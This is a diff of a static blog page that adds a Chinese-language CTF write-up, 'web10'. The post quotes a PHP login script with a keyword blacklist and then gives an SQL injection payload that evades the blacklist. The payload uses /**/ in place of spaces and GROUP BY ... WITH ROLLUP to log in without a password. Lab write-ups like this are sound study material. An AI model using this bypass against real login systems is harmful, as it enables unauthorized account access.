@@ -69,6 +69,50 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/26/web10/" class="article-date">
+  <time class="dt-published" datetime="2025-01-26T14:07:27.000Z" itemprop="datePublished">2025-01-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/26/web10/">web10</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>进入靶机<br>界面是管理员登录的页面<br>需要输入用户名和密码，但不一样的是除了登录键，还有取消键<br>我们试着点一下取消键，获得一个index.php文件<br>用记事本打开<br>&lt;?php<br>		$flag&#x3D;””;<br>        function replaceSpecialChar($strParam){<br>             $regex &#x3D; “&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i”;<br>             return preg_replace($regex,””,$strParam);<br>        }<br>        if (!$con)<br>        {<br>            die(‘Could not connect: ‘ . mysqli_error());<br>        }<br>		if(strlen($username)!&#x3D;strlen(replaceSpecialChar($username))){<br>			die(“sql inject error”);<br>		}<br>		if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){<br>			die(“sql inject error”);<br>		}<br>		$sql&#x3D;”select * from user where username &#x3D; ‘$username’”;<br>		$result&#x3D;mysqli_query($con,$sql);<br>			if(mysqli_num_rows($result)&gt;0){<br>					while($row&#x3D;mysqli_fetch_assoc($result)){<br>						if($password&#x3D;&#x3D;$row[‘password’]){<br>							echo “登陆成功<br>“;<br>							echo $flag;<br>						}</p>
+<pre><code>				 &#125;
+		&#125;
+?&gt;
+</code></pre>
+<p>从文件的$regex &#x3D; “&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i”可以得知sql注入里大多数关键词都被过滤了<br>因此不能使用常规注入的方法<br>根据提示，可以使用with roolup使密码为空，然后进行绕过<br>于是用&#x2F;<strong>&#x2F;代替空格构造<br>‘or&#x2F;</strong>&#x2F;1&#x3D;1&#x2F;<strong>&#x2F;group&#x2F;</strong>&#x2F;by&#x2F;<strong>&#x2F;password&#x2F;</strong>&#x2F;with&#x2F;**&#x2F;rollup#<br>不用输密码<br>点击登录，得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/26/web10/" data-id="cm6dphzph0000rkvafb2a92k6" data-title="web10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/26/web3/" class="article-date">
@@ -409,6 +453,10 @@
       <ul>
         
           <li>
+            <a href="/2025/01/26/web10/">web10</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/26/web3/">web3</a>
           </li>
         
@@ -422,10 +470,6 @@
         
           <li>
             <a href="/2025/01/15/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">web文件上传</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/14/wjl-first-blog/">&#39;wjl-first-blog&#39;</a>
           </li>
         
       </ul>
